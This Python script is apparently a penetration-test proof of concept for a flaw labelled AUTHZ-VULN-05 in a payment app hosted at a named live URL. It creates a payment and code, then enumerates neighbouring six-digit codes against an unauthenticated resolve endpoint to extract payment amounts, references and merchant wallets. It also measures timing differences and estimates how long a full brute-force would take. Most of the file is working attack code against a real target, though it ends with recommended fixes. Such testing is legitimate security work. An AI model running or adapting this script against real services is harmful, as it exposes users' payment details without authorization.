#!/usr/bin/env python3
"""
AUTHZ-VULN-05: Unauthenticated Code Enumeration and Information Disclosure
Tests if GET /api/codes/:code/resolve allows attackers to enumerate codes
and retrieve payment details without authentication.
"""

import requests
import time
import json
from typing import Dict, Any, List, Tuple

BASE_URL = "https://solana-blik.vercel.app"

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(text: str):
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*80}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*80}{Colors.ENDC}\n")

def print_step(step_num: int, description: str):
    print(f"\n{Colors.OKCYAN}{Colors.BOLD}[STEP {step_num}] {description}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'-'*80}{Colors.ENDC}")

def print_success(text: str):
    print(f"{Colors.OKGREEN}[+] {text}{Colors.ENDC}")

def print_error(text: str):
    print(f"{Colors.FAIL}[-] {text}{Colors.ENDC}")

def print_info(text: str):
    print(f"{Colors.OKBLUE}[*] {text}{Colors.ENDC}")

def print_warning(text: str):
    print(f"{Colors.WARNING}[!] {text}{Colors.ENDC}")

def step1_create_payment() -> Tuple[str, Dict[str, Any]]:
    """Step 1: Create a payment"""
    print_step(1, "Create Payment")

    url = f"{BASE_URL}/api/payments/create"
    payload = {
        "amount": 3.5,
        "merchantWallet": "11111111111111111111111111111111"
    }

    print_info(f"POST {url}")
    print_info(f"Payload: {json.dumps(payload, indent=2)}")

    response = requests.post(url, json=payload)
    print_info(f"Status: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print_success(f"Payment created successfully")
        print_info(f"Response: {json.dumps(data, indent=2)}")
        payment_id = data.get('paymentId')
        print_success(f"Payment ID: {payment_id}")
        return payment_id, data
    else:
        print_error(f"Failed to create payment: {response.text}")
        return None, {}

def step2_generate_code() -> Tuple[str, Dict[str, Any]]:
    """Step 2: Generate a BLIK code"""
    print_step(2, "Generate BLIK Code")

    url = f"{BASE_URL}/api/codes/generate"
    payload = {
        "walletPubkey": "22222222222222222222222222222222"
    }

    print_info(f"POST {url}")
    print_info(f"Payload: {json.dumps(payload, indent=2)}")

    response = requests.post(url, json=payload)
    print_info(f"Status: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print_success(f"Code generated successfully")
        print_info(f"Response: {json.dumps(data, indent=2)}")
        code = data.get('code')
        print_success(f"Generated Code: {code}")
        return code, data
    else:
        print_error(f"Failed to generate code: {response.text}")
        return None, {}

def step3_link_payment(payment_id: str, code: str) -> bool:
    """Step 3: Link the code to the payment"""
    print_step(3, "Link Code to Payment")

    url = f"{BASE_URL}/api/payments/link"
    payload = {
        "paymentId": payment_id,
        "code": code
    }

    print_info(f"POST {url}")
    print_info(f"Payload: {json.dumps(payload, indent=2)}")

    response = requests.post(url, json=payload)
    print_info(f"Status: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print_success(f"Code linked to payment successfully")
        print_info(f"Response: {json.dumps(data, indent=2)}")
        return True
    else:
        print_error(f"Failed to link payment: {response.text}")
        return False

def step4_enumerate_codes(actual_code: str) -> List[Dict[str, Any]]:
    """Step 4: EXPLOIT - Enumerate codes to discover the active one"""
    print_step(4, "ENUMERATION EXPLOIT - Test Sequential Codes")

    print_warning("Testing if we can enumerate codes without authentication...")
    print_info(f"Actual code: {actual_code}")

    # Convert code to int for enumeration
    try:
        code_int = int(actual_code)
    except ValueError:
        print_error(f"Code is not numeric: {actual_code}")
        return []

    # Test 10 codes before and 10 codes after the actual code
    start_code = max(0, code_int - 10)
    end_code = min(999999, code_int + 10)

    print_info(f"Testing codes from {start_code:06d} to {end_code:06d}")
    print_info(f"Total codes to test: {end_code - start_code + 1}")

    results = []

    for test_code in range(start_code, end_code + 1):
        code_str = f"{test_code:06d}"
        url = f"{BASE_URL}/api/codes/{code_str}/resolve"

        start_time = time.time()
        response = requests.get(url)
        elapsed_time = (time.time() - start_time) * 1000  # Convert to ms

        result = {
            "code": code_str,
            "status": response.status_code,
            "response_time_ms": round(elapsed_time, 2),
            "response_body": response.text[:200] if response.text else ""
        }

        # Mark if this is the actual code
        is_actual = (code_str == actual_code)

        if is_actual:
            result["is_actual_code"] = True
            print_warning(f"Code {code_str}: Status={response.status_code}, Time={elapsed_time:.2f}ms [ACTUAL CODE]")
        else:
            if response.status_code == 200:
                print_success(f"Code {code_str}: Status={response.status_code}, Time={elapsed_time:.2f}ms [FOUND VALID CODE!]")
            elif response.status_code == 404:
                print_info(f"Code {code_str}: Status={response.status_code}, Time={elapsed_time:.2f}ms [Not found]")
            else:
                print_error(f"Code {code_str}: Status={response.status_code}, Time={elapsed_time:.2f}ms")

        results.append(result)

        # Small delay to avoid rate limiting
        time.sleep(0.1)

    return results

def step5_retrieve_payment_details(code: str) -> Dict[str, Any]:
    """Step 5: IMPACT - Retrieve payment details through the discovered code"""
    print_step(5, "IMPACT - Retrieve Payment Details via Code")

    url = f"{BASE_URL}/api/codes/{code}/resolve"

    print_info(f"GET {url}")
    print_warning("Attempting to retrieve payment details without authentication...")

    response = requests.get(url)
    print_info(f"Status: {response.status_code}")

    if response.status_code == 200:
        data = response.json()
        print_error("VULNERABILITY CONFIRMED: Payment details disclosed!")
        print_info(f"Full Response: {json.dumps(data, indent=2)}")

        # Extract sensitive information
        if 'amount' in data:
            print_error(f"  Amount: {data['amount']}")
        if 'paymentId' in data:
            print_error(f"  Payment ID: {data['paymentId']}")
        if 'reference' in data:
            print_error(f"  Reference: {data['reference']}")
        if 'merchantWallet' in data:
            print_error(f"  Merchant Wallet: {data['merchantWallet']}")

        return data
    else:
        print_success("Endpoint properly protected (expected behavior)")
        print_info(f"Response: {response.text}")
        return {}

def analyze_enumeration_results(results: List[Dict[str, Any]]):
    """Analyze enumeration results to identify patterns"""
    print_step(6, "ANALYSIS - Enumeration Results")

    valid_codes = [r for r in results if r['status'] == 200]
    invalid_codes = [r for r in results if r['status'] != 200]

    print_info(f"Total codes tested: {len(results)}")
    print_info(f"Valid codes found (200): {len(valid_codes)}")
    print_info(f"Invalid codes (non-200): {len(invalid_codes)}")

    if valid_codes:
        print_error(f"\nVULNERABILITY: Found {len(valid_codes)} valid code(s) through enumeration!")
        print_error("Valid codes:")
        for r in valid_codes:
            is_actual = r.get('is_actual_code', False)
            marker = " [ACTUAL]" if is_actual else ""
            print_error(f"  - {r['code']}{marker}: {r['status']} ({r['response_time_ms']}ms)")

    # Calculate timing differences
    if valid_codes and invalid_codes:
        avg_valid_time = sum(r['response_time_ms'] for r in valid_codes) / len(valid_codes)
        avg_invalid_time = sum(r['response_time_ms'] for r in invalid_codes) / len(invalid_codes)

        print_info(f"\nTiming Analysis:")
        print_info(f"  Average response time for valid codes: {avg_valid_time:.2f}ms")
        print_info(f"  Average response time for invalid codes: {avg_invalid_time:.2f}ms")
        print_info(f"  Timing difference: {abs(avg_valid_time - avg_invalid_time):.2f}ms")

        if abs(avg_valid_time - avg_invalid_time) > 50:
            print_warning("  Timing difference > 50ms: Timing attack may be possible!")

def calculate_enumeration_effort():
    """Calculate the effort required to enumerate all codes"""
    print_step(7, "ENUMERATION EFFORT CALCULATION")

    total_codes = 1000000  # 000000 to 999999
    print_info(f"Total possible codes: {total_codes:,}")

    # Assuming 100ms per request (conservative estimate)
    ms_per_request = 100
    total_ms = total_codes * ms_per_request
    total_seconds = total_ms / 1000
    total_minutes = total_seconds / 60
    total_hours = total_minutes / 60
    total_days = total_hours / 24

    print_info(f"\nTime to enumerate all codes (sequential, @100ms/request):")
    print_info(f"  {total_seconds:,.0f} seconds")
    print_info(f"  {total_minutes:,.0f} minutes")
    print_info(f"  {total_hours:,.1f} hours")
    print_info(f"  {total_days:,.1f} days")

    # With parallel requests
    parallel_workers = 10
    parallel_hours = total_hours / parallel_workers
    parallel_days = parallel_hours / 24

    print_info(f"\nWith {parallel_workers} parallel workers:")
    print_info(f"  {parallel_hours:,.1f} hours")
    print_info(f"  {parallel_days:,.1f} days")

    # Realistic attack scenario
    print_info(f"\nRealistic attack scenario:")
    print_info(f"  If codes are sequential and we know approximate range:")
    print_info(f"  Testing 10,000 codes would take ~{(10000 * ms_per_request / 1000 / 60):.1f} minutes")
    print_info(f"  Testing 100,000 codes would take ~{(100000 * ms_per_request / 1000 / 60 / 60):.1f} hours")

def main():
    print_header("AUTHZ-VULN-05: Unauthenticated Code Enumeration Test")

    print_info("Target: https://solana-blik.vercel.app")
    print_info("Vulnerability: Unauthenticated access to code resolution endpoint")
    print_info("Impact: Information disclosure through code enumeration")

    try:
        # Step 1: Create payment
        payment_id, payment_data = step1_create_payment()
        if not payment_id:
            print_error("Failed at Step 1. Exiting.")
            return

        # Step 2: Generate code
        code, code_data = step2_generate_code()
        if not code:
            print_error("Failed at Step 2. Exiting.")
            return

        # Step 3: Link payment
        link_success = step3_link_payment(payment_id, code)
        if not link_success:
            print_error("Failed at Step 3. Exiting.")
            return

        # Step 4: Enumerate codes (THE EXPLOIT)
        enumeration_results = step4_enumerate_codes(code)

        # Step 5: Retrieve payment details (PROVE IMPACT)
        payment_details = step5_retrieve_payment_details(code)

        # Step 6: Analyze results
        if enumeration_results:
            analyze_enumeration_results(enumeration_results)

        # Step 7: Calculate enumeration effort
        calculate_enumeration_effort()

        # Final verdict
        print_header("VULNERABILITY ASSESSMENT")

        valid_codes_found = len([r for r in enumeration_results if r['status'] == 200])

        if valid_codes_found > 0 and payment_details:
            print_error("VERDICT: VULNERABLE")
            print_error("\nThe application is vulnerable to:")
            print_error("1. Unauthenticated code enumeration")
            print_error("2. Information disclosure through code resolution")
            print_error("\nSecurity Impact:")
            print_error("- Attackers can enumerate codes without authentication")
            print_error("- Payment details (amount, merchant, reference) are exposed")
            print_error("- No rate limiting observed")
            print_error("- Sequential code generation makes enumeration easier")
            print_error("\nRecommended Fixes:")
            print_error("1. Require authentication for code resolution endpoint")
            print_error("2. Implement strict rate limiting")
            print_error("3. Use cryptographically random codes instead of sequential")
            print_error("4. Add additional verification (e.g., wallet signature)")
            print_error("5. Log and monitor enumeration attempts")
        else:
            print_success("VERDICT: NOT VULNERABLE")
            print_success("The endpoint appears to be properly protected")

    except Exception as e:
        print_error(f"Error during test execution: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
